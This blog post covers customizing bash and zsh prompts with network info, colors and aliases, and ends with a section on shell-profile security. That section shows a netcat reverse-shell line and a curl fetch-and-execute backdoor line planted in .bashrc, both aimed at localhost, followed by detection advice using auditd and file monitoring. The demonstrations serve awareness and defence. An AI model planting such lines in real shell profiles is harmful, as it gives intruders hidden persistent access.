---
draft: false
date: 2024-05-29
categories:
  - shell
  - cli
  - profiles
  - bash
  - zsh
  - bashrc
  - zshrc
---


# Custom Shell Profiles

Working with and customizing shell profiles.

<!-- more -->

*This file is originally from [straysheep-dev/linux-configs](https://github.com/straysheep-dev/linux-configs/tree/main/shells).*

## References

This draws heavily from the following references:

- <https://www.kali.org/blog/kali-linux-2022-1-release/#shell-prompt-changes>
- <https://www.trustedsec.com/blog/workflow-improvements-for-pentesters/>
- <https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808>
- <https://stackoverflow.com/questions/61335641/bash-or-z-shell-terminal-prompt-with-time-and-date>
- <https://superuser.com/questions/668174/how-can-you-display-host-ip-address-in-bash-prompt>
- <https://unix.stackexchange.com/questions/145672/print-last-element-of-each-row>

Additional resources:

- <https://academy.tcm-sec.com/p/linux-101>
- <https://www.antisyphontraining.com/regular-expressions-your-new-lifestyle-w-joff-thyer/>

The examples below are essentially replicating what's displayed in the [TrustedSec blog post](https://www.trustedsec.com/blog/workflow-improvements-for-pentesters/), in a way that looks like the Kali `zsh`. The [gist by Carlos Polop](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808) has examples for more advanced things you can do such as displaying current CPU, RAM and disk usage in the prompt.


## Prompt String

*Use your shell prompt to track your user, hostname, tty, the date/time, interface information, and working directory.*

```
┌──[user@fedora:1]-[2024-05-13•15:45:11]-[eth0:10.55.55.28/24]-[/tmp]
└─$
```

The following sections detail how to do this with your shell prompt.


### Network Information

Using `ip` and `awk` in functions, networking interface information can be obtained dynamically per system.

- [GNU awk: Comparison Operators](https://www.gnu.org/software/gawk/manual/html_node/Comparison-Operators.html)
- [GNU awk: Exit Statement](https://www.gnu.org/software/gawk/manual/html_node/Exit-Statement.html)
- [GNU awk: Using BEGIN and END](https://www.gnu.org/software/gawk/manual/html_node/Using-BEGIN_002fEND.html)
- [GNU awk: Referencing Elements](https://www.gnu.org/software/gawk/manual/html_node/Reference-to-Elements.html)
- [IBM: awk BEGIN and END Patterns](https://www.ibm.com/docs/en/aix/7.2?topic=awk-command#awk__a171c125b)
- [StackExchange: Print IP Address with Interface](https://unix.stackexchange.com/questions/182400/print-ip-address-with-interface-name)
- [StackExchange: Print all Elements of an Array in awk](https://stackoverflow.com/questions/66526798/print-all-elements-in-an-array-in-awk)
- [StackExchange: Print Array Contents on Same Line with awk](https://stackoverflow.com/questions/54785845/printing-array-contents-in-the-same-line-in-awk)

You'll need `awk` to consider the entire input when processing data. Nested "if" statements in `awk` do not work as expected because data is processed line by line. Printing the input that `awk` is being fed with `print $0` will illustrate what `awk` is seeing and in what order. Basically each line is processed against an entire block of conditionals. This is different than how bash processes input, where the entire input could be considered a single string, where it's all processed at once.

For example: Even if a higher priority match for an if statement exists in the input, unless it appears on an earlier line than a lower priority match, it will never be matched.

```bash
ip link show | awk -F ': ' '{
    if ($2 ~ /tun|tap|wg[0-9]/) {
        print $2
        exit
    } else if ($2 ~ /eth|ens/) {
        print $2
        exit
    }
}'
```

- Assume both `eth0` and `tun0` exist in the output of `ip link show`.
- This `awk` code will always print eth0 because it appears earlier than `tun0` in the output of `ip link show`
- Unintuitively this means it will match on the second condition, because `tun0` hasn't been read yet
- So `tun0` will never be printed
- `ip link show | sort -r | ...` will successfully print `tun0`, proving how `awk` processes data


**Processing Data in awk with the END Pattern**

The shortest way to do this appears to be creating an array of interfaces, and separating interfaces of the same prefix with a space. This gives us our list of interfaces, and the array assignment allows us to control priority, so we'll match first on `tunX/tapX`, then `wgX`, `ensX`, `ethX` and finally `wlan0` type interfaces.

*NOTE: Appending a final pipe to ` | awk '{print $1}')` would ensure that in cases of multiple `ethX` interfaces, only the first is printed. This is otherwise handled by the commented out `#return` line in the `get_net_info()` function.*

```bash
interface_list=$(ip link show | awk -F ': ' '{
    if ($0 !~ /state DOWN/ && $2 ~ /[a-z]+[0-9]/) {
        interfaces[NR] = $2
    }
}
END{
    for(i in interfaces){
        if (interfaces[i] ~ /^tun|^tap/) {
            printf interfaces[i] " "
        } else if (interfaces[i] ~ /^wg[0-9]/) {
            printf interfaces[i] " "
        } else if (interfaces[i] ~ /^ens/) {
            printf interfaces[i] " "
        } else if (interfaces[i] ~ /^eth/) {
            printf interfaces[i] " "
        } else if (interfaces[i] ~ /^wl[a-z]+[0-9]$|^ath[0-9]/) {
            printf interfaces[i] " "
        }
    }
}')
```

Function to get the interface information:

```bash
get_net_info() {
        # Replace `$(echo $interface_list)` with a specific interface name or list of names if needed (e.g. `tun0 eth0`)
        #for interface in tun0 eth0; do
        for interface in $(echo $interface_list); do
                # The `NR==1{<SNIP>; exit}` in awk at the end of the next line only prints the first IP, for interfaces with multipe IPs
                # http://stackoverflow.com/questions/22190902/ddg#22190928
                net_info=$(ip addr show dev "$interface" 2>/dev/null | grep -P "inet\s.+$interface$" | awk 'NR==1{print $NF ":" $2; exit}')
                if [[ "$net_info" != '' ]]; then
                        echo "$net_info" # | tr '\n' ']'  # Uncomment the ` | tr '\n' '|'` if you comment the next line
                        return                            # Comment `return` to print multiple interface matches in $interface_list (eth1, eth2...)
                fi
        done
}
```


### ANSI Colors

The prompt string itself is plain text here, with no color, but your terminal and all of its commands will still be in full color if color printing is supported. Adding color and additional formatting to the prompt string will require some form of using [ANSI escape codes](https://en.wikipedia.org/wiki/ANSI_escape_code).

The easiest way to demonstrate this is with the [linpeas color variables](https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/builder/linpeas_parts/linpeas_base.sh), as they're clear to read instead of raw ANSI escape codes. The `SED_` variables are not necessary here, so they can be omitted.

Write them at the top of your custom file like this:

```bash
#!/bin/bash

<SNIP>

# Colors and color printing code taken directly from:
# https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/builder/linpeas_parts/linpeas_base.sh
C=$(printf '\033')
RED="${C}[1;31m"
GREEN="${C}[1;32m"
YELLOW="${C}[1;33m"
RED_YELLOW="${C}[1;31;103m"
BLUE="${C}[1;34m"
ITALIC_BLUE="${C}[1;34m${C}[3m"
LIGHT_MAGENTA="${C}[1;95m"
LIGHT_CYAN="${C}[1;96m"
LG="${C}[1;37m" #LightGray
DG="${C}[1;90m" #DarkGray
NC="${C}[0m"
UNDERLINED="${C}[5m"
ITALIC="${C}[3m"

<SNIP>
```

To change a section to be green, write `${GREEN}` ahead of the text you wish to change, and `${NC}` (meaning no color) directly behind the text.

- `${GREEN}` changes all subsequent text to green
- `${NC}` returns all subsequent text back to plain text

In this example the date string, and time string, will be green, but the dot `•` that separates them will not.

```bash
# Example snippet
<SNIP>-(${GREEN}\D{%Y-%m-%d}${NC}•${GREEN}\t${NC})-<SNIP>
```


### bash

`bash` is universally available on Linux. Certain escape sequences have unique behavior in bash prompts. These escape characters work the same in bash across different platforms, especially when using a custom shell profile to override any unique changes the OS makes to the shell prompt.

```
# Example Ubuntu `bash` prompt:
┌──[ubuntu@ubuntu2204:2]-(2024-05-13•22:26:15)-(eth0:172.16.1.14/24)-[/tmp]
└─$
```

- `\D{%Y-%m-%d}`: Displays the date based on the format within curly brackets
- `\t`: Displays the time as hh:mm:ss
- `\l`: Shows your current TTY

Matching `.bashrc` prompt string code, if you'd like to try to insert this into your `PS1` variable:

- You'll need to figure out how this fits into your current `PS1` string
- Don't forget to also insert the `$get_net_info` function somewhere above the `PS1` variable
- Harder to maintain

```bash
# Just date/time, net info
<SNIP>:\l]-(\D{%Y-%m-%d}•\t)-($(get_net_info))-<SNIP>
```

Or to replace, your `PS1` variable in a separate dot file (e.g. `~/.custom_shell.sh`):

- You'll lose any special changes or settings your default `.bashrc` prompt string provides
- Add a line at the end of your `.bashrc` to source this file and use it
- Easier to maintain

```bash
<SNIP>
	# Entire variable
	PS1="┌──[\u@\h:\l]-(\D{%Y-%m-%d}•\t)-($(get_net_info))-[\w]\n└─\\$ "
<SNIP>
```


### zsh (Kali)

Both `zsh` and `bash` are customized in Kali, making editing them a different process.

*For `zsh` customization, you may want to look at [ohmyzsh](https://github.com/ohmyzsh/ohmyzsh), which is an entire framework for managing your `zsh` configuration.*

For basic modifications, you can run `kali-tweaks` from any shell, which is a menu to customize the system. `Shell & Prompt` are one of the options, these allow you to enable preset cusomizations to the shell prompt.

Example Kali `zsh` prompt:

```
┌──(kali㉿kali)-[tun0:10.10.20.151/24]-[2024-04-10•11:22:33]-[~/Documents]
└─$
```

These pieces create the above `.zshrc` prompt string:

- The `%b%F{%(#.magent.magenta)}` strings are where you can modify colors
- In Kali's `.zshrc` file, some color terminology is listed below in the `ZSH_HIGHLIGHT_STYLES` variables
- The `get_net_info()` function is written just above `configure_prompt()` in Kail's `.zshrc`, it obtains the IP information based on available interfaces
- `20%D` in `zsh` prints `20YY` where `%D` is two digits (instead of YY) for the current year
- `%*` in `zsh` prints the current time as `hh:mm:ss`, this expression is separated from the next by single quotes plus the `$` sign like this: `%*'$'<next-expression...>`
- The values update automatically each time you press enter

*NOTE: Your function or command substitution needs to be within a string enclosed by one of the single quotes `'` to be called every time you press enter. This is easy to misunderstand, as normally `bash` requires double quotes to interpret anything within quoted strings. Thanks to user gubarz in the HackTheBox Discord for pointing this out.*

Kali prompt string example:

- https://www.shellcheck.net/wiki/SC2155

```bash
<SNIP>
get_net_info() {
<SNIP>

PROMPT=$'%F{%(#.blue.green)}┌──${debian_chroot:+($debian_chroot)─}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))─}(%B%F{%(#.red.blue)}%n'$prompt_symbol$'%m%b%F{%(#.blue.green)})-[%b%F{%(#.magenta.magenta)}$(get_net_info)%b%F{%(#.blue.green)}]-[%b%F{%(#.yellow.yellow)}20%D%b%F{%(#.blue.green)}•%b%F{%(#.yellow.yellow)}%*'$'%b%F{%(#.blue.green)}]-[%B%F{reset}%(6~.%-1~/…/%4~.%5~)%b%F{%(#.blue.green)}]\n└─%B%(#.%F{red}#.%F{blue}$)%b%F{reset} '
<SNIP>
```


### Making the Changes

Putting the above network functions, color variables, and shell escape characters together into a shell profile can be accomplished with minimal mess by writing all of these modifications to a single file, and dot sourcing it. This is ideal over trying to manually edit the `~/.bashrc` or shell profiles that ship with your OS, as the code there can be unreadable and hard to work with if you're not familiar with how `bash` or `zsh` work.

For example, take the following code block containing our shell modifications:

```bash
#!/bin/bash

# Colors and color printing code taken directly from:
# https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/builder/linpeas_parts/linpeas_base.sh
C=$(printf '\033')
RED="${C}[1;31m"
GREEN="${C}[1;32m"
YELLOW="${C}[1;33m"
RED_YELLOW="${C}[1;31;103m"
BLUE="${C}[1;34m"
ITALIC_BLUE="${C}[1;34m${C}[3m"
LIGHT_MAGENTA="${C}[1;95m"
LIGHT_CYAN="${C}[1;96m"
LG="${C}[1;37m" #LightGray
DG="${C}[1;90m" #DarkGray
NC="${C}[0m"
UNDERLINED="${C}[5m"
ITALIC="${C}[3m"

interface_list=$(ip link show | awk -F ': ' '{
    if ($0 !~ /state DOWN/ && $2 ~ /[a-z]+[0-9]/) {
        interfaces[NR] = $2
    }
}
END{
    for(i in interfaces){
        if (interfaces[i] ~ /^tun|^tap/) {
            printf interfaces[i] " "
        } else if (interfaces[i] ~ /^wg[0-9]/) {
            printf interfaces[i] " "
        } else if (interfaces[i] ~ /^ens/) {
            printf interfaces[i] " "
        } else if (interfaces[i] ~ /^eth/) {
            printf interfaces[i] " "
        } else if (interfaces[i] ~ /^wl[a-z]+[0-9]$|^ath[0-9]/) {
            printf interfaces[i] " "
        }
    }
}')

get_net_info() {
        # Replace `$(echo $interface_list)` with a specific interface name or list of names if needed (e.g. `tun0 eth0`)
        #for interface in eth0; do
        for interface in $(echo $interface_list); do
                # The `NR==1{<SNIP>; exit}` in awk at the end of the next line only prints the first IP, for interfaces with multipe IPs
                # http://stackoverflow.com/questions/22190902/ddg#22190928
                net_info=$(ip addr show dev "$interface" 2>/dev/null | grep -P "inet\s.+$interface$" | awk 'NR==1{print $NF ":" $2; exit}')
                if [[ "$net_info" != '' ]]; then
                        echo "$net_info" # | tr '\n' ']'  # Uncomment the ` | tr '\n' '|'` if you comment the next line
                        return                            # Comment out "return", and uncomment the | tr '\n' ']' above to print multiple interface matches in $interface_list (eth1, eth2...)
                fi
        done
}

# Plain text prompt string
if [ "$PS1" ]; then
    PS1="┌──[\u@\h:\l]-[\D{%Y-%m-%d}•\t]-[$(get_net_info)]-[ \W]\n└─\\$ "
fi

# Color prompt string
#if [ "$PS1" ]; then
#    PS1="┌──[${GREEN}\u${NC}@${GREEN}\h${NC}:${LIGHT_MAGENTA}\l${NC}]-[${LIGHT_CYAN}\D{%Y-%m-%d}${NC}•${LIGHT_CYAN}\t${NC}]-[${YELLOW}$(get_net_info)${NC}]-[${GREEN}\w${NC}]\n└─\\$ "
#fi
```

Write all of it to one of the following paths:

- `/etc/profile.d/custom_shell.sh`
- `~/.custom_shell.sh`

Ensure it's being dot sourced by your `~/.bashrc` file. For example, on Fedora, just writing the modifications to `/etc/profile.d/custom_shell.sh` and opening a new shell session is enough. On Ubuntu, add the following line to your `~/.bashrc`:

```bash
if [[ -f ~/.custom_shell.sh ]]; then
    . ~/.custom_shell.sh
fi
```

This will source that file, loading it into your shell. The above example effectively overwrites your default `PS1` shell prompt variable.


## Testing Changes

**Modifying your shell can completely break your system.** It's important to test anything in a sandbox, VM, or temporary cloud environment. The following steps make it easy to recover should anything go wrong. This way you aren't repeatedly restoring snapshots or reprovisioning your VM.

- Always have two sessions open
- Backup any files you're modifying `cp ~/.bashrc ~/.bashrc.bkup`
- One session stays open and never loads the modifications into its shell
- One session is used to dot source or load changes and test them out
- If anything breaks, kill the broken session and undo the breaking changes with your functioning session


## Aliases

It's also worth including some examples for aliases. Use these for sets of commands you execute regularly:

```bash
# custom aliases
alias c='clear'
alias dualshark='wireshark& wireshark&'
```


## bashrc Security

As always, when researching custom `.bashrc`, `.zshrc`, or other shell configurations, *be absolutely sure you've reviewed the code before dropping it into a system*. These files make great targets for reverse connections and code execution, as they function like shell scripts. Anything with write access to these files can backdoor them.

Here are two practical examples you can try using localhost (these are not meant to harm your system, but it's always recommended to do things like this in a test environment such as a VM).


### Reverse Shell

This uses `netcat` to simulate a reverse shell.

On our "server" or the attacker's machine waiting to receive a connection:
```bash
nc -nvlp 1234 -s 127.0.1.1
```

On our "client", this line is added to the victim machine's .bashrc file:
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -nv 127.0.1.1 1234 > /tmp/f
```

Running `source ~/.bashrc`, you'll notice the listener on the "attacker" side now has a shell on your system.


### Profile Backdoor

To be more realistic we'll use a python webserver to host a payload and `curl` to download it to memory and execute it.

We'll write a payload to delete itself silently after spawning `gnome-calculator`.

First `cd` to `~/Public` and write the following text to a file named `test.sh`:

```bash
#!/bin/bash

gnome-calculator&
rm "$0"
```

Then start our webserver using python's built in http.server module:

```bash
python3 -m http.server 1234 --bind 127.0.1.1
```

Now on the "victim" side, add the following line to the bottom of your `~/.bashrc` file:

```bash
curl -s http://127.0.1.1:1234/test.sh > /dev/shm/test.sh; chmod +x /dev/shm/test.sh; /dev/shm/test.sh
```

As soon as you `source ~/.bashrc` or open a new terminal tab / window, `gnome-calculator` will spawn. You'll also notice:

- No trace of `test.sh` in `/dev/shm/`
- Aside from the obvious `gnome-calculator` window, the terminal window has full focus and did not print any errors or messages
- `ps axjf` shows `gnome-calculator` spawned as though you ran it yourself, there's not process tree of `curl` > `/bin/bash` > `gnome-calculator`


### Detecting Modification

Hopefully this illustrates how powerful shell profiles are. It wouldn't make sense to not provide suggestions on how to detect this.

[Relevant file paths](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#shell-files):

- `/etc/profile`
- `/etc/profile.d/*`
- `/etc/bashrc`
- `/etc/bash_completion.d/*`
- `/etc/skel/*`
- `~/.bash*`
- `~/.profile`
- `~/.zshrc`
- `~/.zlogin`
- and more


**String Searching**

Regularly reviewing the (writable) files for strings such as protocol connection strings like `://` or `\\\\` can point to malicious behavior, especially in files that were recently modified that shouldn't have been.

Similarly, high-entropy or obviously encoded / obfuscated strings are indicators of suspicious activity. Conversely [low-entropy lists of words or plaintext referenced or put together by functions](https://github.com/yoda66/PythonShellcodeRedux/blob/main/words_encode.py) is another techique to "hide in plain sight". These make it hard to see an obvious backdoor just by reading the source code, but the command will be built and executed. This will appear in logs if you're monitoring for it, assuming this technique is not also wiping logs.


**auditd**

Using `auditd` you can record and find this behavior. Like Sysmon, [you'll need to configure what it records](https://github.com/straysheep-dev/setup-auditd). If you're monitoring the use of `curl`:

```bash
sudo ausearch -ts recent -c curl
```

Will show every time `curl` was executed in the last 10 minutes. If you followed along with the example then in your logs you'll find:

```
type=EXECVE msg=audit(<time>:<event-id>): argc=3 a0="curl" a1="-s" a2="http://127.0.1.1:1234/test.sh"
```

Which is a pretty good indicator and starting point for further investigation.

You can do the same with the file `.bashrc` itself:

```bash
sudo ausearch -ts recent -f bashrc
```

This will show all entries related to files named `bashrc`. Here again, following the examples you may find `gedit` or `vi` was used to edit `~/.bashrc`.


**Intrusion Detection**

Lastly, an IDS like `aide`, `tripwire`, `samhain`, or an endpoint agent like `wazuh` can be configured to monitor these directories. If changes are ever reported to your `~/.bashrc` or shell profiles, be sure to review them.